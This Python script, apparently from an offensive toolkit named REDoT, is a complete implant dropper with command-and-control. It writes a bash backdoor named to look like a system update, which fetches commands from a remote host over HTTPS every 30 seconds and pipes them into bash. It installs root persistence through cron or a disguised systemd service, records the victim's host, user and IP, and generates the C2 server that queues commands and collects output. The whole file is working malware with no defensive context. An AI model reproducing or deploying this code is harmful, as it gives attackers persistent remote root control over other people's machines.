#!/usr/bin/env python3
"""
implant_dropper.py - REDoT Payload Module
Drops a stealth implant with persistence, remote callback, and live C2.
Auto-generates a real cmd_server.py HTTPS listener if missing.
"""

import os
import platform
import socket
import getpass
import uuid
from pathlib import Path
import subprocess
from datetime import datetime

# Configurable
IMPLANT_NAME = "systemd-update"
CALLBACK_HOST = ""  # Will auto-detect if empty
CALLBACK_PORT = 8443
PERSIST_METHOD = "cron"  # or 'systemd'
INSTALL_DIR = "/tmp/.sys"
AGENT_LOG = "logs/implants/agents.log"
CRON_FILE = "/etc/cron.d/systemd-update"
C2_SERVER_FILE = "cmd_server.py"
CERT_FILE = "cert.pem"
KEY_FILE = "key.pem"
CMD_QUEUE = "cmd_queues.json"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def ensure_dirs():
    os.makedirs(INSTALL_DIR, exist_ok=True)
    os.makedirs("logs/implants", exist_ok=True)

def generate_certificates():
    if not os.path.exists(CERT_FILE) or not os.path.exists(KEY_FILE):
        print("[*] Generating self-signed TLS certificate...")
        subprocess.run([
            "openssl", "req", "-newkey", "rsa:2048", "-nodes", "-keyout", KEY_FILE,
            "-x509", "-days", "365", "-out", CERT_FILE,
            "-subj", "/CN=redot-c2"
        ])

def generate_cmd_server():
    if not os.path.exists(C2_SERVER_FILE):
        print("[*] Generating real HTTPS cmd_server.py...")
        with open(C2_SERVER_FILE, "w") as f:
            f.write(f"""#!/usr/bin/env python3
import json, os
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime

PORT = {CALLBACK_PORT}
CERT_FILE = "{CERT_FILE}"
KEY_FILE = "{KEY_FILE}"
CMD_QUEUE = "{CMD_QUEUE}"
LOG_FILE = "logs/c2_server.log"

if not os.path.exists(CMD_QUEUE):
    with open(CMD_QUEUE, "w") as f: f.write('{{}}')

class C2Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        agent = self.headers.get("X-Agent-ID", "unknown")
        with open(CMD_QUEUE) as f:
            queues = json.load(f)
        cmd = queues.pop(agent, "")
        with open(CMD_QUEUE, "w") as f:
            json.dump(queues, f, indent=2)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(cmd.encode())
        log(f"[GET] {agent} -> {cmd}")

    def do_POST(self):
        agent = self.headers.get("X-Agent-ID", "unknown")
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode()
        log(f"[POST] {agent} -> RESULT: {data}")
        self.send_response(200)
        self.end_headers()

def log(msg):
    os.makedirs("logs", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(f"{{datetime.now().isoformat()}} | {{msg}}\\n")

if __name__ == "__main__":
    print(f"[+] REDoT cmd_server listening on port {{PORT}}...")
    httpd = HTTPServer(('0.0.0.0', PORT), C2Handler)
    httpd.socket = ssl_wrap(httpd.socket)
    httpd.serve_forever()

def ssl_wrap(sock):
    import ssl
    return ssl.wrap_socket(sock, keyfile=KEY_FILE, certfile=CERT_FILE, server_side=True)
""")
        os.chmod(C2_SERVER_FILE, 0o755)

def build_implant(callback_ip, callback_port):
    implant_path = os.path.join(INSTALL_DIR, IMPLANT_NAME)
    with open(implant_path, "w") as f:
        f.write(f"""#!/bin/bash
while true; do
  CMD=$(curl -ks https://{callback_ip}:{callback_port}/cmd -H "X-Agent-ID: $(hostname)-$(whoami)")
  echo "$CMD" | bash
  sleep 30
done
""")
    os.chmod(implant_path, 0o755)
    return implant_path

def install_persistence(implant_path):
    if PERSIST_METHOD == "cron":
        cron_line = f"* * * * * root {implant_path} >/dev/null 2>&1\n"
        with open(CRON_FILE, "w") as f:
            f.write(cron_line)
        print(f"[+] Persistence installed via cron: {CRON_FILE}")
    elif PERSIST_METHOD == "systemd":
        service_path = f"/etc/systemd/system/{IMPLANT_NAME}.service"
        service_data = f"""[Unit]
Description=System Update Service

[Service]
ExecStart={implant_path}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
"""
        with open(service_path, "w") as f:
            f.write(service_data)
        subprocess.run(["systemctl", "daemon-reexec"])
        subprocess.run(["systemctl", "enable", f"{IMPLANT_NAME}.service"])
        subprocess.run(["systemctl", "start", f"{IMPLANT_NAME}.service"])
        print(f"[+] Persistence installed via systemd: {service_path}")

def log_agent_info():
    agent_id = f"{uuid.uuid4()} | {socket.gethostname()} | {getpass.getuser()} | {get_local_ip()}"
    with open(AGENT_LOG, "a") as f:
        f.write(agent_id + "\n")
    print(f"[+] Logged agent: {agent_id}")

def drop_implant():
    print("[*] Deploying implant and C2 components...")
    ip = CALLBACK_HOST if CALLBACK_HOST else get_local_ip()
    ensure_dirs()
    generate_certificates()
    generate_cmd_server()
    implant_path = build_implant(ip, CALLBACK_PORT)
    install_persistence(implant_path)
    log_agent_info()
    print("[✓] Implant deployed, persistence enabled, C2 server ready.")

if __name__ == "__main__":
    drop_implant()
